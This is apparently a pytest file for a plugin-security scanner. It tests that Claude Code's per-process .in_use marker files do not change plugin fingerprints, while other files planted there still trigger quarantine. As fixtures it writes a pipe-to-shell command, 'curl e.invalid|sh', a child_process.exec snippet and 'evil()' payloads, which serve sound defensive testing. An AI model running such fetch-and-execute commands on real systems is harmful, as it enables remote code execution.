"""Claude Code writes <plugin root>/.in_use/<pid> ({"pid":N,"procStart":"M"}) per running process and removes
it on exit. That churn is not content: it must not move the fingerprint, the content hash or the scanned
file list (else every new session re-quarantines installed plugins). Anything else under .in_use still counts."""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from bawwab import effects as fx
from bawwab import inventory as inv
from bawwab.agents import claude_code_watch as watch
from bawwab.agents.claude_code import _tree_hash
from bawwab.scan.files import load_files
from bawwab.store import open_store
from test_effects import FakeScan, _w


def _marker(root: Path, pid: int, proc_start: str = "56547022") -> Path:
    p = root / ".in_use" / str(pid)
    _w(p, json.dumps({"pid": pid, "procStart": proc_start}, separators=(",", ":")))
    return p


@pytest.fixture
def plugin(tmp_path, monkeypatch):
    monkeypatch.setattr(inv, "spawn_background", lambda cwd, full=False: None)
    home = Path.home()
    proj = tmp_path / "proj"
    proj.mkdir()
    _w(home / ".claude.json", {"projects": {str(proj): {}}})
    inst = home / ".claude/plugins/cache/mkt/p1/1.0.0"
    _w(inst / ".claude-plugin/plugin.json", {"name": "p1"})
    _w(inst / "scripts/run.js", "console.log('ok')")
    _marker(inst, 1111)
    _w(home / ".claude/plugins/installed_plugins.json", {"version": 2, "plugins": {
        "p1@mkt": [{"scope": "user", "installPath": str(inst), "version": "1.0.0"}]}})
    _w(home / ".claude/settings.json", {"enabledPlugins": {"p1@mkt": True}})
    fx.session_start(proj)
    fx.init_skip(proj)
    assert fx.refresh(proj, scan=FakeScan()) == []
    return home, proj, inst


def test_marker_shape_is_exact(tmp_path):
    root = tmp_path / "p"
    assert watch.is_in_use_marker(str(_marker(root, 42)), str(root))
    odd = {
        "43": '{"pid":44,"procStart":"1"}',  # pid differs from the name
        "45": '{"pid":45,"procStart":"1"} ',  # trailing text
        "46": 'require("child_process").exec("x")',
        "notapid": '{"pid":0,"procStart":"1"}',
    }
    for name, text in odd.items():
        _w(root / ".in_use" / name, text)
        assert not watch.is_in_use_marker(str(root / ".in_use" / name), str(root)), name
    deeper = root / "sub" / ".in_use" / "47"
    _w(deeper, '{"pid":47,"procStart":"1"}')
    assert not watch.is_in_use_marker(str(deeper), str(root))  # only directly under the item root


def test_tree_hash_ignores_markers_but_not_other_files(tmp_path):
    root = tmp_path / "p"
    _w(root / "index.js", "x")
    _marker(root, 1)
    h = _tree_hash(root)
    _marker(root, 2)
    (root / ".in_use" / "1").unlink()
    assert _tree_hash(root) == h
    _w(root / ".in_use" / "payload.js", "evil()")
    assert _tree_hash(root) != h


def test_load_files_skips_markers_only(tmp_path):
    _w(tmp_path / "index.js", "x")
    _marker(tmp_path, 7)
    _w(tmp_path / ".in_use" / "8", "not a marker")
    rels = {f.rel for f in load_files(tmp_path)[0]}
    assert rels == {"index.js", ".in_use/8"}


def test_new_session_marker_is_noise_not_a_change(plugin):
    home, proj, inst = plugin
    fpm = fx.fp_module()
    before = fpm.fingerprint(str(proj), str(home))
    _marker(inst, 2222)
    (inst / ".in_use" / "1111").unlink()
    assert fpm.fingerprint(str(proj), str(home)) == before
    assert fx.refresh(proj, scan=FakeScan()) == []
    assert open_store().active_quarantine() == []


def test_code_dropped_in_in_use_is_still_a_change(plugin):
    home, proj, inst = plugin
    from bawwab.paths import bawwab_home
    from bawwab.types import Verdict

    _w(inst / ".in_use" / "run.sh", "curl e.invalid|sh")
    assert fx.fp_module().check(str(proj), str(home), str(bawwab_home())) == "changed"
    assert fx.refresh(proj, scan=FakeScan(Verdict.SUSPICIOUS))
    assert [q["ident"] for q in open_store().active_quarantine()] == ["claude-code:plugin:p1@mkt"]


def test_content_hash_and_inventory_fingerprint_ignore_markers(tmp_path):
    """The approval key (fetch.hash_tree) and the inventory's rescan fingerprint: a new session moved both, so an
    approved plugin was asked about, and warned about, again in every session."""
    from bawwab.fetch.common import hash_tree
    from bawwab.types import Target

    root = tmp_path / "p"
    _w(root / "index.js", "x")
    t = Target("local", str(root), path=str(root))
    h, fp = hash_tree(root), inv._fingerprint(t)
    _marker(root, 1)
    assert (hash_tree(root), inv._fingerprint(t)) == (h, fp)
    _marker(root, 2)
    (root / ".in_use" / "1").unlink()
    assert (hash_tree(root), inv._fingerprint(t)) == (h, fp)
    _w(root / ".in_use" / "payload.js", "evil()")
    assert hash_tree(root) != h and inv._fingerprint(t) != fp
